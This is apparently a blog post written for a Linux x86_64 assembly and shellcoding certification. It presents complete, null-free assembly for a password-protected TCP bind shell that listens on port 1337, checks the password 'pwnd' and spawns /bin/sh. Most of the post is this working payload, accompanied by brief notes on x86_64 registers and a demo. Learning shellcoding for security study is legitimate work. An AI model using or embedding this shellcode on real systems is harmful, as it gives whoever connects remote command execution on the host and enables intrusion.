Introduction
------------
In this post we will create a custom TCP bind shell for Linux x86_64 architecture that requires password to spawn a shell. Please note we wont be going into too much details on how each function work as this has already been discussed in my previous post [here](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/).

Shellcode
---------
If you’re not familiar with x86_64 assembly its pretty much the same as x86 from shellcoding perspective. The following are the key add-ons (I should say) that you get when using x86_64 assembly as opposed to x86:

* The registers hold twice as much as x86 ones (8 bytes).
* You have 8 more registers (R8-R15).
* The ability to craft position independent shellcode using Instruction Pointer Relative Addressing.

I used `read()` function to check for input via `stdin` and then compare it to a predefined password (in this case I used `pwnd`), if the check fails the shellcode will jump to `_nop` section which will effectivly cause the bind shell to crash. Please refer to the link in the introduction section for more in-depth analysis of the functions used by the bind shell. The following is the final null-free shellcode.

```nasm
global _start

section .text

_start:

	; int socket(int domain, int type, int protocol)
	; rax=41, rdi=2, rsi=1, rdx=0
	xor esi,esi
	mul esi                
	inc esi
	push 2 
	pop rdi
	add al, 41
	syscall

	; save socket fd in rdi
	xchg   rdi,rax

	; setup sockaddr strcture (af_inet=2, port=1337, inaddr_any, 0)
     push 2
     mov word [rsp + 2], 0x3905
     push rsp      
     pop rsi

	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; rax=49, rdi=fd, rsi=rsp, rdx=16
	push 0x31
	pop rax
	push rsp
	pop rsi
	push 0x10
	pop rdx
	syscall

	; int listen(int sockfd, int backlog)
	; rax=50, rdi=fd, rsi=who cares
	pop rsi
	push 0x32
	pop rax
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; rax=43, rdi=fd, rsi=rsp, rdx=16
	sub rsp, 0x10
	push rsp
	pop rsi
	push 0x2b
	pop rax
	push 0x10
	push rsp
	pop rdx
	syscall

	; store newly spawnd fd in r9
	xchg r9,rax

	; close parent socket
	xor rax, rax
	push 0x30
	pop rax
	syscall

	; dup2 (new, old)
	; rax=33, rdi=new fd, rsi=0,1,2 (stdin, stdout, stderr)
	xchg   rdi,r9
	push 0x3
	pop rsi
_loop:
	push 0x21
	pop rax
	dec esi
	syscall
	loopnz _loop

	; read (int fd, void *bf, size_t count)
	; rax=0, rdi=0 (stdin), rsi=rsp, rdx=4 (pwnd)
	xor rax, rax
	push rax
	pop rdi
	push rax
	push rsp
	pop rsi
	push 0x4
	pop rdx
	syscall

	; check passcode (pwnd)
	push 0x646e7770
	pop rbx
	cmp dword [rsi], ebx
	jne _nop

	; int execve(cont char *filename, char *const argv[], char *const envp[])
	; rax=59, rdi=*/bin//sh, rsi=0, rdx=0
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	push rax
	push rsp
	pop rsi
	cdq
	push 0x3b
	pop rax
	syscall
	
_nop:
	nop
```

Now comes that fun part, let’s test out the shellcode.

![](/assets/images/Password_Protected_TCP_Bind_Shell_Linux_x86_64/BindShellDemo.gif)

Closing Thoughts
----------------
I feel like passwords are essential when it comes to bind shells and hope this post will benefit folks looking to create one. All of the above code are available on my [github](https://github.com/ihack4falafel/SLAE64/tree/master/Assignment%201). Feel free to contact me for questions via Twitter [@ihack4falafel](https://twitter.com/ihack4falafel). This post is one of many to come so stay tuned!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certiﬁcation:

[http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html)

Student ID: SLAE64–1579
